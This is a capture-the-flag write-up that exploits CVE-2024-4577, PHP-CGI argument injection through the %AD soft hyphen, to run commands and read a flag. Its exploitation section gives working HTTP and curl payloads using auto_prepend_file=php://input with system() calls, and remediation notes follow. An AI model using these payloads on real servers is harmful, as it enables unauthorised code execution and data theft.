# Cipher's Heritage Vault - Web Challenge Writeup

## Challenge Info
- Name: Cipher's Heritage Vault
- URL: http://116.202.100.86:48721/
- Category: Web Exploitation
- Goal: Retrieve the flag from the target service

## Summary
The challenge presents itself as a static-file-only legacy Windows service. However, the main page leaks a critical hint in an HTML comment indicating:
- PHP is running in CGI mode
- Locale is `zh_TW` (Traditional Chinese)
- `%AD` (soft hyphen) is mapped to `-` on Windows

This combination is a direct indicator of **CVE-2024-4577** (PHP-CGI argument injection on Windows locale/codepage edge cases).

By injecting CGI arguments via query string and setting `auto_prepend_file=php://input`, arbitrary PHP from POST body can be executed. This gave command execution and allowed reading `flag.txt`.

## Recon
### 1. Fingerprint the service
A request to `/` returned:
- `X-Powered-By: PHP/8.1.2`
- `X-Server-OS: Windows NT 6.1`
- `Server: Apache/2.4.54 (Win64)`

The HTML contained a hidden developer note:

```html
<!--
    Dev Notes:
    - Running PHP in CGI mode for compatibility
    - Windows locale set to zh_TW for legacy support
    - Remember: %AD = soft hyphen, Windows maps it to '-'
-->
```

This is the key exploitation hint.

## Vulnerability
## CVE-2024-4577 (PHP-CGI Argument Injection)
In vulnerable Windows PHP-CGI setups, specially encoded characters like `%AD` can be interpreted as command-line option prefixes. This allows attacker-controlled CGI options to be passed to PHP.

The core abusive options used:
- `-d allow_url_include=1`
- `-d auto_prepend_file=php://input`

Once active, PHP executes attacker-supplied POST body as code before target script execution.

## Exploitation
### 1. Verify code execution
Payload pattern:

```http
POST /index.php?%add+allow_url_include=1+%add+auto_prepend_file=php://input HTTP/1.1
Host: 116.202.100.86:48721
Content-Type: application/x-www-form-urlencoded

<?php system('dir'); ?>
```

Equivalent curl command:

```bash
curl -i -X POST "http://116.202.100.86:48721/index.php?%add+allow_url_include=1+%add+auto_prepend_file=php://input" \
  --data "<?php system('dir'); ?>"
```

Observed output included:

```text
<!-- CVE-2024-4577 EXPLOITED! -->
index.php
flag.txt
config.ini
```

### 2. Read the flag
Use command execution primitive to read file contents:

```bash
curl -i -X POST "http://116.202.100.86:48721/index.php?%add+allow_url_include=1+%add+auto_prepend_file=php://input" \
  --data "<?php system('type flag.txt'); ?>"
```

Response contained:

```text
CIPH{cve_2024_4577_php_cgi_arg_inj_0xAD}
```

## Flag

```text
CIPH{cve_2024_4577_php_cgi_arg_inj_0xAD}
```

## Why This Worked
- PHP CGI mode was exposed behind web requests.
- Windows locale behavior allowed `%AD` normalization into a hyphen-like switch prefix.
- CGI argument injection enabled runtime directive changes.
- `auto_prepend_file=php://input` converted request body into executable PHP.

## Remediation Notes
- Patch PHP to a fixed version for CVE-2024-4577.
- Avoid direct PHP-CGI exposure in web server configs.
- Disable dangerous execution functions (`system`, `exec`, `shell_exec`, etc.) where possible.
- Use hardened handlers (e.g., PHP-FPM style architecture) and strict request filtering.

## Repro Checklist
- [x] Service fingerprinted
- [x] Hidden hint identified
- [x] CVE-2024-4577 payload tested
- [x] Command execution confirmed
- [x] `flag.txt` read successfully
